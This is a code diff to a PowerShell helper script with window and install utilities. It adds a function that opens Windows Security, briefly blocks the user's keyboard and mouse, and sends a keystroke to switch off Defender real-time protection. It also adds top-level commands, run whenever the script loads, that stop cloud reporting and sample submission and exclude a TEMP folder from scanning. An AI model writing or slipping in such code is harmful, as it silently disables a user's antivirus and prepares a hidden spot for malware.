@@ -37,6 +37,38 @@ function set-window {
 	$show | % { $null = [Window]::ShowWindow($hwnd, $_) }
 }
 
+function DefenderRealTimeProtection {
+	[Alias('drtp')]
+	param(
+		[bool]$status = $true
+	)
+$code = @"
+[DllImport("user32.dll")]
+public static extern bool BlockInput(bool fBlockIt);
+"@
+	if ((Get-MpComputerStatus).RealTimeProtectionEnabled -ne $status) {
+		$userInput = Add-Type -MemberDefinition $code -Name UserInput -Namespace UserInput -PassThru
+		while($true) {
+			explorer windowsdefender://ThreatSettings
+			do {
+				Start-Sleep -Milliseconds 1500
+				$wid = (Get-Process | Where-Object {$_.MainWindowTitle -eq "Windows 보안"}).Id
+			} until ($wid -ne '')
+			Start-Sleep -Milliseconds 1500
+			$wshell = New-Object -ComObject WScript.Shell
+			$null = $userInput::BlockInput($true)
+			$null = $wshell.AppActivate($wid)
+			$wshell.SendKeys(" ")
+			$null = $userInput::BlockInput($false)
+			Start-Sleep -Milliseconds 1500
+			if ((Get-MpComputerStatus).RealTimeProtectionEnabled -eq $status) {
+				Stop-Process $wid
+				break
+			}
+		}
+	}
+}
+
 function current-cursor-position {
 	[Alias('ccp')]
 	param(
@@ -97,5 +129,9 @@ function install-7zip {
 		$null = Install-Module 7Zip4PowerShell -Force
 	}
 }
+
+Set-MpPreference -MAPSReporting Disable
+Set-MpPreference -SubmitSamplesConsent NeverSend
+Add-MpPreference -ExclusionPath "$Env:TEMP\ssokka" -Force
 
 set-window
